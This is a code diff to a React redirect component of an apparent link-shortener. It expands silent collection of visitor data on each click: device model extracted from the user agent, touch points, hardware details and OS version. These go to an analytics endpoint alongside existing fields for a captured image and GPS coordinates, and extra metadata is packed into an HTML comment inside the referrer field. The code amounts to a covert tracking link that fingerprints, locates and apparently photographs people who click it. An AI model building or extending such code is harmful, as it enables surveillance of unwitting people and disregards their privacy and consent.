@@ -66,12 +66,70 @@ export default function Redirect({ shortCode }: { shortCode: string }) {
       } catch (err) {}
 
       const networkType = (navigator as any).connection?.effectiveType || (navigator as any).connection?.type || 'Unknown';
-      const screenResolution = `${window.screen.width}x${window.screen.height}`;
+      const screenResolution = `${window.screen.width}×${window.screen.height}`;
       const language = navigator.language;
       const hardwareConcurrency = navigator.hardwareConcurrency || null;
       const deviceMemory = (navigator as any).deviceMemory || null;
       const colorDepth = window.screen.colorDepth || null;
       const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
+      const rawUserAgent = navigator.userAgent || '';
+      const touchPoints = typeof navigator.maxTouchPoints === 'number' ? navigator.maxTouchPoints : 0;
+
+      // Extract device vendor and model
+      let deviceModel = result.device.model || '';
+      let deviceVendor = result.device.vendor || '';
+      const osName = result.os.name || 'Unknown';
+      const osVersion = result.os.version || '';
+
+      // Pattern matching for specific models (Tecno, Infinix, Xiaomi, Samsung, etc.)
+      if (!deviceModel) {
+        const tecnoMatch = rawUserAgent.match(/\b(Tecno\s+[A-Za-z0-9\s+]+?)(?=[;\)])/i);
+        const infinixMatch = rawUserAgent.match(/\b(Infinix\s+[A-Za-z0-9\s+]+?)(?=[;\)])/i);
+        const redmiMatch = rawUserAgent.match(/\b(Redmi\s+[A-Za-z0-9\s+]+?)(?=[;\)])/i);
+        const samsungMatch = rawUserAgent.match(/\bSM-[A-Za-z0-9]+(?=[;\)])/i);
+        if (tecnoMatch) deviceModel = tecnoMatch[1].trim();
+        else if (infinixMatch) deviceModel = infinixMatch[1].trim();
+        else if (redmiMatch) deviceModel = redmiMatch[1].trim();
+        else if (samsungMatch) deviceModel = `Samsung ${samsungMatch[0]}`;
+      }
+
+      let fullDeviceModel = '';
+      if (deviceVendor && deviceModel) {
+        fullDeviceModel = deviceModel.toLowerCase().includes(deviceVendor.toLowerCase())
+          ? deviceModel
+          : `${deviceVendor} ${deviceModel}`;
+      } else if (deviceModel) {
+        fullDeviceModel = deviceModel;
+      } else if (osName.toLowerCase().includes('android')) {
+        fullDeviceModel = 'Android Device';
+      } else if (osName.toLowerCase().includes('ios')) {
+        fullDeviceModel = 'Apple iPhone';
+      } else if (osName.toLowerCase().includes('windows')) {
+        fullDeviceModel = 'Windows PC';
+      } else if (osName.toLowerCase().includes('mac')) {
+        fullDeviceModel = 'Apple Mac';
+      } else {
+        fullDeviceModel = 'Desktop PC';
+      }
+
+      const isMobile = result.device.type === 'mobile' || touchPoints > 0 || /android|iphone|ipad|ipod/i.test(rawUserAgent);
+      const isTablet = result.device.type === 'tablet' || /ipad|tablet/i.test(rawUserAgent);
+      const category = isTablet ? 'Tablet' : isMobile ? 'Mobile' : 'Desktop';
+      const formattedDeviceType = `${fullDeviceModel} (${category})`;
+      const formattedOs = osVersion ? `${osName} ${osVersion}` : osName;
+
+      // Pack metadata inside referrer tag for lossless fallback storage
+      const metaPayload = JSON.stringify({
+        device_model: fullDeviceModel,
+        device_type: formattedDeviceType,
+        os_version: formattedOs,
+        touch_points: touchPoints,
+        user_agent: rawUserAgent,
+        hardware_concurrency: hardwareConcurrency,
+      });
+
+      const cleanReferrer = document.referrer || 'Direct';
+      const packedReferrer = `${cleanReferrer} <!--${metaPayload}-->`;
 
       // Send telemetry in background with keepalive (never blocks redirection!)
       fetch('/api/analytics', {
@@ -82,10 +140,10 @@ export default function Redirect({ shortCode }: { shortCode: string }) {
           shortCode,
           ipAddress: 'Auto',
           locationName: 'Auto',
-          deviceType: result.device.type || 'Desktop',
+          deviceType: formattedDeviceType,
           browser: result.browser.name || 'Unknown',
-          os: result.os.name || 'Unknown',
-          referrer: document.referrer || 'Direct',
+          os: formattedOs,
+          referrer: packedReferrer,
           capturedImage: customIntel?.image || null,
           latitude: customIntel?.lat || null,
           longitude: customIntel?.lon || null,
@@ -100,6 +158,9 @@ export default function Redirect({ shortCode }: { shortCode: string }) {
           timezone,
           webglVendor,
           webglRenderer,
+          touchPoints,
+          deviceModel: fullDeviceModel,
+          userAgent: rawUserAgent,
         }),
         keepalive: true,
       }).catch(() => {});
